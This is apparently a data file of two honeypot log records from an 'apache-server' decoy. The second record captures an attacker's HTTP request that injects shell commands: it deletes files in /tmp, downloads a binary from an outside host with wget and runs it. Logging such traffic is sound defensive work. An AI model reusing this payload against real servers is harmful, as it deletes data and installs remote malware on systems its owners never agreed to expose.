{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"87422976-5cd1-469f-9125-4b1f29054ed5","logkind":"connection","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"2023-03-31T19:58:30.389972","parsedMessage":{"timestamp":"2023-03-31 19:58:30.389972","message_type":null,"correlation_id":null,"level":"INFO","message":"connection-log connection from 47.100.102.203:20541 to port 80","ip":"47.100.102.203"},"id":"a159f957-abb8-4609-9b7a-ed743686b671","EventProcessedUtcTime":"2023-03-31T19:58:30.7910643Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-31T19:58:30.6330000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/87422976-5cd1-469f-9125-4b1f29054ed5/apache-server/47.100.102.203"}
{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"87422976-5cd1-469f-9125-4b1f29054ed5","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Fri Mar 31 19:59:01 UTC 2023","parsedMessage":{"timestamp":"2023-03-31 19:58:29+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"47.100.102.203 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.215.81.11/jaws;chmod+/tmp/jaws;sh+/tmp/jaws\" 400 0 \"-\" \"-\"","ip":"47.100.102.203"},"id":"44af3b55-38c5-44d4-8290-ee278b4d59e2","EventProcessedUtcTime":"2023-03-31T19:59:01.9632291Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-31T19:59:01.4620000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/87422976-5cd1-469f-9125-4b1f29054ed5/apache-server/47.100.102.203"}